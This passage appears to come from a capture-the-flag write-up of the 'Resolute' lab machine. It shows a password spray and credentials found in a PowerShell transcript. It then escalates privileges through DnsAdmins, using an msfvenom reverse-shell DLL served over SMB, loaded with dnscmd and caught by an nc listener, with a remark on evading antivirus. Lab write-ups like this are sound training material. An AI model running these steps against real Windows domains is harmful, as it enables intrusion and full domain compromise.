+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">fred</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">angela</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">felicia</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">gustavo</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">ulf</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">stevie</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">claire</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">paulo</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">steve</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">annette</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">annika</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">per</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">claude</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[+]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">melanie</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span>
+</code></pre></div><p>Turned out the password was correct for user melanie <strong>melanie:Welcome123!</strong></p>
+<p>Using smbmap shares were listed but nothing interesting was found.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/smbmap.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+Remote access was tried on the machine using the creds and it was successfull</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/melanie_evilwinrm.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>The user.txt flag</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/user..png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p><strong>Privilege Escalation</strong></p>
+<p>Finding users of the system</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Users</span>\melanie<span style="color:#f92672">&gt;</span> net user
+
+<span style="color:#66d9ef">User</span> accounts <span style="color:#66d9ef">for</span> 
+abigail                  <span style="color:#66d9ef">Administrator</span>            angela
+annette                  annika                   claire
+claude                   <span style="color:#66d9ef">DefaultAccount</span>           felicia
+fred                     <span style="color:#66d9ef">Guest</span>                    gustavo
+krbtgt                   marcus                   marko
+melanie                  naoki                    paulo
+per                      ryan                     sally
+simon                    steve                    stevie
+sunita                   ulf                      zach
+</code></pre></div><p>Manually enumerating the directories an interesting directory was discovered.</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/pstranscripts.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>Digging further into the directory, a file was found</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">*</span><span style="color:#66d9ef">Evil</span><span style="color:#f92672">-</span><span style="color:#66d9ef">WinRM</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">PS</span> <span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">PSTranscripts</span>\<span style="color:#ae81ff">20191203</span><span style="color:#f92672">&gt;</span> dir <span style="color:#f92672">-</span>force
+    <span style="color:#e6db74">Directory</span>: <span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">PSTranscripts</span>\<span style="color:#ae81ff">20191203</span>
+
+<span style="color:#66d9ef">Mode</span>                <span style="color:#66d9ef">LastWriteTime</span>         <span style="color:#66d9ef">Length</span> <span style="color:#66d9ef">Name</span>
+<span style="color:#f92672">----</span>                <span style="color:#f92672">-------------</span>         <span style="color:#f92672">------</span> <span style="color:#f92672">----</span>
+<span style="color:#f92672">-</span>arh<span style="color:#f92672">--</span>        <span style="color:#ae81ff">12</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2019</span>   <span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">45</span> <span style="color:#66d9ef">AM</span>           <span style="color:#ae81ff">3732</span> <span style="color:#66d9ef">PowerShell_transcript</span><span style="color:#f92672">.</span>RESOLUTE<span style="color:#f92672">.</span>OJuoBGhU<span style="color:#f92672">.</span><span style="color:#ae81ff">20191203063201</span><span style="color:#f92672">.</span>txt
+</code></pre></div><p>Inside credentials of ryan was found</p>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ryan.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>credentials&ndash;&gt; <strong>ryan:Serv3r4Admin4cc123!</strong></p>
+<p>After successfull remote login suing the creds, <strong>whoami /all</strong> was ran and interestingly ryan was a member of <strong>DnsAdmins</strong>
+Another way to check the group of a user is <strong>(Get-ADUser userName –Properties MemberOf).MemberOf</strong> or <strong>net user userName /domain</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">GROUP</span> <span style="color:#66d9ef">INFORMATION</span>
+<span style="color:#66d9ef">Group</span> <span style="color:#66d9ef">Name</span>                                 <span style="color:#66d9ef">Type</span>             <span style="color:#66d9ef">SID</span>                                            <span style="color:#66d9ef">Attributes</span>
+
+<span style="color:#66d9ef">Everyone</span>                                   <span style="color:#66d9ef">Well</span><span style="color:#f92672">-</span>known group S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>                                        <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">BUILTIN</span>\<span style="color:#66d9ef">Users</span>                              <span style="color:#66d9ef">Alias</span>            S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">545</span>                                   <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">BUILTIN</span>\<span style="color:#66d9ef">Pre</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Windows</span> <span style="color:#ae81ff">2000</span> <span style="color:#66d9ef">Compatible</span> <span style="color:#66d9ef">Access</span> <span style="color:#66d9ef">Alias</span>            S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">554</span>                                   <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">BUILTIN</span>\<span style="color:#66d9ef">Remote</span> <span style="color:#66d9ef">Management</span> <span style="color:#66d9ef">Users</span>            <span style="color:#66d9ef">Alias</span>            S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">580</span>                                   <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">NT</span> <span style="color:#66d9ef">AUTHORITY</span>\<span style="color:#66d9ef">NETWORK</span>                       <span style="color:#66d9ef">Well</span><span style="color:#f92672">-</span>known group S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>                                        <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">NT</span> <span style="color:#66d9ef">AUTHORITY</span>\<span style="color:#66d9ef">Authenticated</span> <span style="color:#66d9ef">Users</span>           <span style="color:#66d9ef">Well</span><span style="color:#f92672">-</span>known group S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>                                       <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">NT</span> <span style="color:#66d9ef">AUTHORITY</span>\<span style="color:#66d9ef">This</span> <span style="color:#66d9ef">Organization</span>             <span style="color:#66d9ef">Well</span><span style="color:#f92672">-</span>known group S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">15</span>                                       <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">MEGABANK</span>\<span style="color:#66d9ef">Contractors</span>                       <span style="color:#66d9ef">Group</span>            S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1392959593</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3013219662</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3596683436</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1103</span> <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">MEGABANK</span>\<span style="color:#66d9ef">DnsAdmins</span>                         <span style="color:#66d9ef">Alias</span>            S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1392959593</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3013219662</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3596683436</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1101</span> <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group, <span style="color:#66d9ef">Local</span> <span style="color:#66d9ef">Group</span>
+<span style="color:#66d9ef">NT</span> <span style="color:#66d9ef">AUTHORITY</span>\<span style="color:#66d9ef">NTLM</span> <span style="color:#66d9ef">Authentication</span>           <span style="color:#66d9ef">Well</span><span style="color:#f92672">-</span>known group S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>                                    <span style="color:#66d9ef">Mandatory</span> group, <span style="color:#66d9ef">Enabled</span> by default, <span style="color:#66d9ef">Enabled</span> group
+<span style="color:#66d9ef">Mandatory</span> <span style="color:#66d9ef">Label</span>\<span style="color:#66d9ef">Medium</span> <span style="color:#66d9ef">Mandatory</span> <span style="color:#66d9ef">Level</span>     <span style="color:#66d9ef">Label</span>            S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">16</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8192</span>
+</code></pre></div><p>After some googling, a blog was found that explained how to privesc using members of dnsadmins <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">here</a></p>
+<p>so a dll payload was created using msfvenom</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">❯</span> msfvenom <span style="color:#f92672">-</span>p windows<span style="color:#f92672">/</span>x64<span style="color:#f92672">/</span>shell_reverse_tcp <span style="color:#66d9ef">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span> <span style="color:#66d9ef">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">4443</span> <span style="color:#f92672">--</span>platform<span style="color:#f92672">=</span>windows <span style="color:#f92672">-</span>f dll <span style="color:#f92672">&gt;</span> privesc<span style="color:#f92672">.</span>dll
+<span style="color:#f92672">[-]</span> <span style="color:#66d9ef">No</span> arch selected, selecting <span style="color:#e6db74">arch</span>: x64 from the payload
+<span style="color:#66d9ef">No</span> encoder <span style="color:#f92672">or</span> badchars specified, outputting raw payload
+<span style="color:#66d9ef">Payload</span> <span style="color:#e6db74">size</span>: <span style="color:#ae81ff">460</span> bytes
+<span style="color:#66d9ef">Final</span> size of dll <span style="color:#e6db74">file</span>: <span style="color:#ae81ff">5120</span> bytes
+</code></pre></div><p>Then hosted the file using smb, hosting it with smb was chosen because windows supports UNC paths and samba shares by default in most cases. Also, <strong>there are times when the victim’s AV or defender may delete the payload if uploaded</strong>.</p>
+<p>Created the smbserver using impackets smbserver.py as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">❯</span> sudo smbserver<span style="color:#f92672">.</span>py <span style="color:#66d9ef">SHARE</span> <span style="color:#f92672">.</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> <span style="color:#e6db74">astrah</span>: 
+<span style="color:#66d9ef">Impacket</span> v0<span style="color:#f92672">.</span><span style="color:#ae81ff">9</span><span style="color:#f92672">.</span><span style="color:#ae81ff">22</span><span style="color:#f92672">.</span>dev1<span style="color:#f92672">+</span><span style="color:#ae81ff">20200929</span><span style="color:#f92672">.</span><span style="color:#ae81ff">152157</span><span style="color:#f92672">.</span>fe642b24 <span style="color:#f92672">-</span> <span style="color:#66d9ef">Copyright</span> <span style="color:#ae81ff">2020</span> <span style="color:#66d9ef">SecureAuth</span> <span style="color:#66d9ef">Corporation</span>
+
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Config</span> file parsed
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Callback</span> added <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">UUID</span> <span style="color:#ae81ff">4</span><span style="color:#66d9ef">B324FC8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1670</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#66d9ef">D3</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1278</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#66d9ef">A47BF6EE188</span> <span style="color:#e6db74">V</span>:<span style="color:#ae81ff">3</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Callback</span> added <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">UUID</span> <span style="color:#ae81ff">6</span><span style="color:#66d9ef">BFFD098</span><span style="color:#f92672">-</span><span style="color:#66d9ef">A112</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3610</span><span style="color:#f92672">-</span><span style="color:#ae81ff">9833</span><span style="color:#f92672">-</span><span style="color:#ae81ff">46</span><span style="color:#66d9ef">C3F87E345A</span> <span style="color:#e6db74">V</span>:<span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Config</span> file parsed
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Config</span> file parsed
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Config</span> file parsed
+</code></pre></div><p>Testing was done to see if the victim machine could access the share and it was successfull</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">*</span><span style="color:#66d9ef">Evil</span><span style="color:#f92672">-</span><span style="color:#66d9ef">WinRM</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">PS</span> <span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Users</span>\ryan\<span style="color:#66d9ef">Documents</span><span style="color:#f92672">&gt;</span> net view \\<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span>
+<span style="color:#66d9ef">Shared</span> resources at \\<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span>
+
+(null)
+<span style="color:#66d9ef">Share</span> name  <span style="color:#66d9ef">Type</span>  <span style="color:#66d9ef">Used</span> as  <span style="color:#66d9ef">Comment</span>
+
+<span style="color:#f92672">-------------------------------------------------------------------------------</span>
+<span style="color:#66d9ef">SHARE</span>       <span style="color:#66d9ef">Disk</span>
+<span style="color:#66d9ef">The</span> command completed successfully<span style="color:#f92672">.</span>
+</code></pre></div><p>Next, the below command was used on powershell to inject the generated payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">*</span><span style="color:#66d9ef">Evil</span><span style="color:#f92672">-</span><span style="color:#66d9ef">WinRM</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">PS</span> <span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Users</span>\ryan\<span style="color:#66d9ef">Documents</span><span style="color:#f92672">&gt;</span> dnscmd<span style="color:#f92672">.</span>exe <span style="color:#e6db74">/config /se</span>rverlevelplugindll \\<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span>\<span style="color:#66d9ef">SHARE</span>\privesc<span style="color:#f92672">.</span>dll
+
+<span style="color:#66d9ef">Registry</span> property serverlevelplugindll successfully reset<span style="color:#f92672">.</span>
+<span style="color:#66d9ef">Command</span> completed successfully<span style="color:#f92672">.</span>
+</code></pre></div><p>Then finally, restarting the dns server</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">*</span><span style="color:#66d9ef">Evil</span><span style="color:#f92672">-</span><span style="color:#66d9ef">WinRM</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">PS</span> <span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Users</span>\ryan\<span style="color:#66d9ef">Documents</span><span style="color:#f92672">&gt;</span> sc<span style="color:#f92672">.</span>exe stop dns
+
+<span style="color:#e6db74">SERVICE_NAME</span>: dns
+        <span style="color:#66d9ef">TYPE</span>               : <span style="color:#ae81ff">10</span>  <span style="color:#66d9ef">WIN32_OWN_PROCESS</span>
+        <span style="color:#66d9ef">STATE</span>              : <span style="color:#ae81ff">3</span>  <span style="color:#66d9ef">STOP_PENDING</span>
+                                (<span style="color:#66d9ef">STOPPABLE</span>, <span style="color:#66d9ef">PAUSABLE</span>, <span style="color:#66d9ef">ACCEPTS_SHUTDOWN</span>)
+        <span style="color:#66d9ef">WIN32_EXIT_CODE</span>    : <span style="color:#ae81ff">0</span>  (<span style="color:#ae81ff">0x0</span>)
+        <span style="color:#66d9ef">SERVICE_EXIT_CODE</span>  : <span style="color:#ae81ff">0</span>  (<span style="color:#ae81ff">0x0</span>)
+        <span style="color:#66d9ef">CHECKPOINT</span>         : <span style="color:#ae81ff">0x0</span>
+        <span style="color:#66d9ef">WAIT_HINT</span>          : <span style="color:#ae81ff">0x0</span>
+<span style="color:#f92672">*</span><span style="color:#66d9ef">Evil</span><span style="color:#f92672">-</span><span style="color:#66d9ef">WinRM</span><span style="color:#f92672">*</span> <span style="color:#66d9ef">PS</span> <span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Users</span>\ryan\<span style="color:#66d9ef">Documents</span><span style="color:#f92672">&gt;</span> sc<span style="color:#f92672">.</span>exe start dns
+
+<span style="color:#e6db74">SERVICE_NAME</span>: dns
+        <span style="color:#66d9ef">TYPE</span>               : <span style="color:#ae81ff">10</span>  <span style="color:#66d9ef">WIN32_OWN_PROCESS</span>
+        <span style="color:#66d9ef">STATE</span>              : <span style="color:#ae81ff">2</span>  <span style="color:#66d9ef">START_PENDING</span>
+                                (<span style="color:#66d9ef">NOT_STOPPABLE</span>, <span style="color:#66d9ef">NOT_PAUSABLE</span>, <span style="color:#66d9ef">IGNORES_SHUTDOWN</span>)
+        <span style="color:#66d9ef">WIN32_EXIT_CODE</span>    : <span style="color:#ae81ff">0</span>  (<span style="color:#ae81ff">0x0</span>)
+        <span style="color:#66d9ef">SERVICE_EXIT_CODE</span>  : <span style="color:#ae81ff">0</span>  (<span style="color:#ae81ff">0x0</span>)
+        <span style="color:#66d9ef">CHECKPOINT</span>         : <span style="color:#ae81ff">0x0</span>
+        <span style="color:#66d9ef">WAIT_HINT</span>          : <span style="color:#ae81ff">0x7d0</span>
+        <span style="color:#66d9ef">PID</span>                : <span style="color:#ae81ff">3516</span>
+        <span style="color:#66d9ef">FLAGS</span>              :
+</code></pre></div><p>And we got administrator shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">❯</span> sudo nc <span style="color:#f92672">-</span>nlvp <span style="color:#ae81ff">4443</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> <span style="color:#e6db74">astrah</span>: 
